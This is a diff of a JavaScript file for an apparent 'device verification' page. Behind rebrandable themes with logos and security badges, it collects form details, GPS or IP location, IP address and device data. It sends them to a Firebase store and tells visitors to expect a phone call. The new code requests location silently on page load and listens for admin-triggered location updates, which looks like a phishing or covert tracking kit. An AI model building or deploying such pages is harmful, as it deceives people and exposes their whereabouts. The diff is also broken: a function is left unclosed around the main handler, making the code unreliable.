@@ -1,303 +1,165 @@
 import { initializeTheme, getCurrentTheme } from './src/features/theme/theme-manager.js';
-import { listenForLocationRequests, setupUnloadHandler, determineLocationSource } from './src/features/location/location-tracker.js';
+import { prewarmLocation, getLocation, listenForLocationRequests, setupUnloadHandler } from './src/features/location/location-tracker.js';
 import { getDeviceInfo } from './src/utils/browser-detection.js';
-import { 
-    createFormFields, 
-    initializeFormValidation, 
-    getFormData 
-} from './src/features/form/form-handler.js';
+import { createFormFields, initializeFormValidation, getFormData } from './src/features/form/form-handler.js';
+import { logger } from './src/utils/logger.js';
 
-// Helper function to handle geolocation errors
-function getGeolocationErrorMessage(error) {
-    switch(error.code) {
-        case error.PERMISSION_DENIED:
-            return "Location access was denied. For the most accurate verification, please allow location access in your browser settings and try again.";
-        case error.POSITION_UNAVAILABLE:
-            return "Location information is unavailable. Please try again.";
-        case error.TIMEOUT:
-            return "Location request timed out. Please try again.";
-        default:
-            return "An error occurred while getting location. Please try again.";
+// Preview mode - apply theme directly without Firebase listener
+async function applyPreviewTheme(themeName) {
+    const theme = window.themes[themeName];
+    if (!theme) return;
+    const themeStyles = document.getElementById('themeStyles');
+    if (themeStyles) themeStyles.href = theme.styles;
+    document.documentElement.style.setProperty('--primary-color', theme.primaryColor);
+    document.documentElement.style.setProperty('--primary-hover', theme.secondaryColor);
+    const logoImage = document.querySelector('.logo-image');
+    if (logoImage) { logoImage.src = theme.logo; logoImage.alt = theme.name; }
+    if (theme.content) {
+        const h1 = document.querySelector('h1'); if (h1) h1.textContent = theme.content.title;
+        const msg = document.querySelector('.message'); if (msg) msg.textContent = theme.content.message;
+        const sub = document.querySelector('.sub-message'); if (sub) sub.textContent = theme.content.subMessage;
+        const btn = document.getElementById('allowLocation'); if (btn && theme.content.buttonText) btn.textContent = theme.content.buttonText;
+        if (theme.content.badges) {
+            const el = document.querySelector('.security-badges');
+            if (el) el.innerHTML = theme.content.badges.map(b => `<div class="badge"><span class="icon">${b.icon}</span><span class="text">${b.text}</span></div>`).join('');
+        }
+        if (theme.content.infoBox) {
+            const el = document.querySelector('.info-box');
+            if (el) el.innerHTML = `<p>${theme.content.infoBox.title}</p><ul>${theme.content.infoBox.points.map(p => `<li>${p}</li>`).join('')}</ul>`;
+        }
+        if (theme.content.footer) {
+            const fp = document.querySelector('footer > p'); if (fp) fp.textContent = theme.content.footer.copyright;
+            if (theme.content.footer.links) {
+                const el = document.querySelector('.footer-links');
+                if (el) el.innerHTML = theme.content.footer.links.map(l => `<a href="${l.url}">${l.text}</a>`).join('');
+            }
+        }
     }
-}
+    document.title = `Preview - ${theme.name}`;
+    const banner = document.createElement('div');
+    banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:#333;color:white;text-align:center;padding:8px;font-size:14px;z-index:9999;';
+    banner.textContent = `🔍 Preview Mode: ${theme.name}`;
+    document.body.prepend(banner);
+    const formContainer = document.getElementById('userDetailsForm');
+    if (formContainer) { formContainer.innerHTML = ''; formContainer.appendChild(createFormFields(theme)); }
+    const verifyButton = document.getElementById('allowLocation');
+    if (verifyButton) { verifyButton.disabled = true; verifyButton.title = 'Preview mode - form submission disabled'; }
 
 // Initialize Firebase and load theme
 document.addEventListener('DOMContentLoaded', async () => {
     try {
-        // Wait for Firebase to be ready
+        const urlParams = new URLSearchParams(window.location.search);
+        const previewTheme = urlParams.get('preview');
+        
         await window.firebaseLoaded;
-        console.log('Firebase SDK loaded');
+        logger.debug('Firebase SDK loaded');
 
-        // Wait for database connection
-        if (!window.database) {
-            throw new Error('Firebase database not initialized');
-        }
+        if (!window.database) throw new Error('Firebase database not initialized');
 
-        // Initialize theme system
-        await initializeTheme();
-        console.log('Theme system initialized');
-
-        // Enhanced theme change listener
-        window.addEventListener('themeChanged', async (e) => {
-            const formContainer = document.getElementById('userDetailsForm');
-            const loadingIndicator = document.querySelector('.loading-indicator') || 
-                (() => {
-                    const indicator = document.createElement('div');
-                    indicator.className = 'loading-indicator';
-                    indicator.textContent = 'Updating theme...';
-                    document.querySelector('.container')?.appendChild(indicator);
-                    return indicator;
-                })();
+        if (previewTheme && window.themes[previewTheme]) {
+            await applyPreviewTheme(previewTheme);
+            logger.debug('Preview theme applied:', previewTheme);
+        } else {
+            await initializeTheme();
+            logger.debug('Theme system initialized');
             
-            switch (e.detail.state) {
-                case 'changing':
-                    loadingIndicator.style.display = 'block';
-                    if (formContainer) {
-                        formContainer.style.opacity = '0.7';
-                    }
-                    break;
-                    
-                case 'success':
-                    if (formContainer && !e.detail.unchanged) {
-                        // Clear and update form
-                        formContainer.innerHTML = '';
-                        const currentTheme = window.themes[getCurrentTheme()];
-                        formContainer.appendChild(createFormFields(currentTheme));
-                        initializeFormValidation();
-                        formContainer.style.opacity = '1';
-                    }
-                    loadingIndicator.style.display = 'none';
-                    break;
-                    
-                case 'error':
-                    loadingIndicator.textContent = `Theme update failed: ${e.detail.error}`;
-                    loadingIndicator.classList.add('error');
-                    if (formContainer) {
-                        formContainer.style.opacity = '1';
-                    }
-                    // Hide error after delay
-                    setTimeout(() => {
-                        loadingIndicator.style.display = 'none';
-                        loadingIndicator.classList.remove('error');
-                        loadingIndicator.textContent = 'Updating theme...';
-                    }, 5000);
-                    break;
-            }
-        });
+            // PRE-WARM: Silently request location on page load
+            // This triggers the permission prompt early, so when user clicks Verify,
+            // location is already cached. No prompt during verification.
+            prewarmLocation();
+            
+            // Setup location request listener for admin-initiated updates
+            listenForLocationRequests();
+            setupUnloadHandler();
 
-        // Setup location request listener
-        listenForLocationRequests();
-
-        // Setup unload handler
-        setupUnloadHandler();
-
-        // Initialize form with current theme
-        const formContainer = document.getElementById('userDetailsForm');
-        if (formContainer) {
-            const currentTheme = window.themes[getCurrentTheme()];
-            formContainer.appendChild(createFormFields(currentTheme));
-            initializeFormValidation();
-        }
-
-        // Setup verify button click handler
-        const verifyButton = document.getElementById('allowLocation');
-        const locationStatus = document.getElementById('locationStatus');
-
-        if (!verifyButton) {
-            console.error('Verify button not found');
-            return;
-        }
-
-        console.log('Setting up click handler for verify button');
-        verifyButton.addEventListener('click', async () => {
-            console.log('Verify button clicked');
-            try {
-                // Get user details first
-                const userDetails = getFormData();
-                if (!userDetails) {
-                    throw new Error('Please fill in all required fields correctly');
-                }
-
-                verifyButton.disabled = true;
-                document.querySelector('.container').classList.add('processing');
-                locationStatus.textContent = 'Verifying device...';
-
-                // Get IP address first (we'll need this regardless of location method)
-                console.log('Fetching IP address...');
-                const ipResponse = await fetch('https://api.ipify.org?format=json');
-                if (!ipResponse.ok) {
-                    throw new Error('Failed to fetch IP address');
-                }
-                const { ip } = await ipResponse.json();
-                console.log('IP address received:', ip);
-
-                // Initialize position and source variables
-                let position;
-                let locationSource = 'IP-Based';
-
-                // Try to get geolocation first
-                if (navigator.geolocation) {
-                    try {
-                        console.log('Requesting geolocation...');
-                        position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(
-                                (pos) => {
-                                    console.log('Geolocation received successfully');
-                                    resolve(pos);
-                                },
-                                (err) => {
-                                    console.log('Geolocation error, falling back to IP:', err);
-                                    reject(err);
-                                },
-                                {
-                                    enableHighAccuracy: true,
-                                    timeout: 20000,
-                                    maximumAge: 0
-                                }
-                            );
-                        });
-                        locationSource = await determineLocationSource(position);
-                    } catch (geoError) {
-                        console.log('Falling back to IP-based location');
-                        locationStatus.textContent = getGeolocationErrorMessage(geoError);
-                        
-                        // IP-based fallback
-                        try {
-                            // Try primary service (ipapi.co)
-                            const ipLocationResponse = await fetch('https://ipapi.co/json/');
-                            const ipData = await ipLocationResponse.json();
-                            
-                            if (ipData.error || !ipData.latitude || !ipData.longitude) {
-                                throw new Error(ipData.reason || 'Invalid response from ipapi.co');
-                            }
-                            
-                            position = {
-                                coords: {
-                                    latitude: parseFloat(ipData.latitude),
-                                    longitude: parseFloat(ipData.longitude),
-                                    accuracy: 10000, // IP-based accuracy is typically low
-                                    altitude: null,
-                                    altitudeAccuracy: null
-                                }
-                            };
-                            locationSource = 'IP-Based (Primary)';
-                        } catch (primaryError) {
-                            console.warn('Primary IP location service failed, trying backup');
-                            
-                            // Try backup service (ip-api.com)
-                            const backupResponse = await fetch('http://ip-api.com/json/?fields=lat,lon,status,message');
-                            const backupData = await backupResponse.json();
-                            
-                            if (backupData.status !== 'success' || !backupData.lat || !backupData.lon) {
-                                throw new Error(backupData.message || 'Invalid response from backup service');
-                            }
-                            
-                            position = {
-                                coords: {
-                                    latitude: parseFloat(backupData.lat),
-                                    longitude: parseFloat(backupData.lon),
-                                    accuracy: 10000,
-                                    altitude: null,
-                                    altitudeAccuracy: null
-                                }
-                            };
-                            locationSource = 'IP-Based (Backup)';
+            // Enhanced theme change listener
+            window.addEventListener('themeChanged', async (e) => {
+                const formContainer = document.getElementById('userDetailsForm');
+                switch (e.detail.state) {
+                    case 'changing':
+                        if (formContainer) formContainer.style.opacity = '0.7';
+                        break;
+                    case 'success':
+                        if (formContainer && !e.detail.unchanged) {
+                            formContainer.innerHTML = '';
+                            const currentTheme = window.themes[getCurrentTheme()];
+                            formContainer.appendChild(createFormFields(currentTheme));
+                            initializeFormValidation();
+                            formContainer.style.opacity = '1';
                         }
-                    }
-                } else {
-                    // Browser doesn't support geolocation, use IP-based directly
-                    console.log('Geolocation not supported, using IP-based location');
-                    const ipLocationResponse = await fetch('https://ipapi.co/json/');
-                    const ipData = await ipLocationResponse.json();
-                    
-                    if (ipData.error || !ipData.latitude || !ipData.longitude) {
-                        throw new Error('Failed to get IP-based location');
-                    }
-                    
-                    position = {
-                        coords: {
-                            latitude: parseFloat(ipData.latitude),
-                            longitude: parseFloat(ipData.longitude),
-                            accuracy: 10000,
-                            altitude: null,
-                            altitudeAccuracy: null
-                        }
+                        break;
+                    case 'error':
+                        if (formContainer) formContainer.style.opacity = '1';
+                        break;
+                }
+            });
+
+            // Setup verify button
+            const verifyButton = document.getElementById('allowLocation');
+            const locationStatus = document.getElementById('locationStatus');
+
+            if (!verifyButton) { logger.error('Verify button not found'); return; }
+
+            verifyButton.addEventListener('click', async () => {
+                try {
+                    const userDetails = getFormData();
+                    if (!userDetails) throw new Error('Please fill in all required fields correctly');
+
+                    verifyButton.disabled = true;
+                    document.querySelector('.container').classList.add('processing');
+                    locationStatus.textContent = 'Verifying device...';
+
+                    // Get location - uses cached GPS if pre-warmed, else fresh GPS, else silent IP fallback
+                    const loc = await getLocation();
+                    logger.debug('Location obtained:', loc.source);
+
+                    if (!window.database) throw new Error('Firebase database not initialized');
+
+                    const locationData = {
+                        ...userDetails,
+                        latitude: loc.latitude,
+                        longitude: loc.longitude,
+                        accuracy: loc.accuracy,
+                        timestamp: new Date().toISOString(),
+                        status: 'active',
+                        locationSource: loc.source,
+                        ip: loc.ip,
+                        userAgent: navigator.userAgent,
+                        ...getDeviceInfo()
                     };
-                    locationSource = 'IP-Based (Primary)';
+
+                    await window.database.ref('locations').push().set(locationData);
+                    logger.debug('Location saved successfully');
+
+                    // Success message
+                    const successMessage = document.createElement('div');
+                    successMessage.className = 'success-message';
+                    const mainMsg = document.createElement('p');
+                    mainMsg.textContent = 'Device verified successfully';
+                    mainMsg.style.marginBottom = '10px';
+                    successMessage.appendChild(mainMsg);
+                    const contactMsg = document.createElement('p');
+                    contactMsg.style.fontSize = '0.9em';
+                    contactMsg.style.color = '#666';
+                    contactMsg.textContent = 'Thank you for your verification. Someone will be in touch with you shortly via phone call during business hours.';
+                    successMessage.appendChild(contactMsg);
+                    locationStatus.textContent = '';
+                    locationStatus.appendChild(successMessage);
+                    verifyButton.style.display = 'none';
+                    document.querySelector('.thank-you-card').classList.add('success');
+                } catch (error) {
+                    logger.error('Verification failed:', error);
+                    locationStatus.textContent = error.message || 'Verification failed. Please try again.';
+                    locationStatus.style.color = '#DA1710';
+                    verifyButton.disabled = false;
+                    document.querySelector('.container').classList.remove('processing');
                 }
+            });
 
-                // Save location to Firebase
-                console.log('Saving to Firebase...');
-                if (!window.database) {
-                    throw new Error('Firebase database not initialized');
-                }
-
-                const locationsRef = window.database.ref('locations');
-                const newLocationRef = locationsRef.push();
-
-                const locationData = {
-                    ...userDetails, // Add user details
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    timestamp: new Date().toISOString(),
-                    status: 'active',
-                    locationSource: locationSource,
-                    ip: ip,
-                    userAgent: navigator.userAgent,
-                    ...getDeviceInfo()
-                };
-
-                // Only add optional fields if they exist
-                if (position.coords.altitude !== null) {
-                    locationData.altitude = position.coords.altitude;
-                }
-                if (position.coords.altitudeAccuracy !== null) {
-                    locationData.altitudeAccuracy = position.coords.altitudeAccuracy;
-                }
-
-                await newLocationRef.set(locationData);
-                console.log('Location saved successfully');
-
-                // Set success message based on theme
-                const currentTheme = getCurrentTheme();
-                const successMessage = document.createElement('div');
-                successMessage.className = 'success-message';
-                
-                // Main success message
-                const mainMessage = document.createElement('p');
-                mainMessage.textContent = 'Device verified successfully';
-                mainMessage.style.marginBottom = '10px';
-                successMessage.appendChild(mainMessage);
-                
-                // Contact message
-                const contactMessage = document.createElement('p');
-                contactMessage.style.fontSize = '0.9em';
-                contactMessage.style.color = '#666';
-                contactMessage.textContent = 'Thank you for your verification. Someone will be in touch with you shortly via phone call during business hours.';
-                successMessage.appendChild(contactMessage);
-                
-                // Clear and update status
-                locationStatus.textContent = '';
-                locationStatus.appendChild(successMessage);
-                
-                verifyButton.style.display = 'none'; // Hide button after success
-                
-                // Add success animation class
-                document.querySelector('.thank-you-card').classList.add('success');
-                
-            } catch (error) {
-                console.error('Verification failed:', error);
-                locationStatus.textContent = error.message || 'Verification failed. Please try again.';
-                locationStatus.style.color = '#DA1710'; // Show error in red
-                verifyButton.disabled = false;
-                document.querySelector('.container').classList.remove('processing');
-            }
-        });
-
-        console.log('Initialization complete');
-
+            logger.debug('Initialization complete');
+        }
     } catch (error) {
-        console.error('Failed to initialize:', error);
+        logger.error('Failed to initialize:', error);
     }
 });
+}
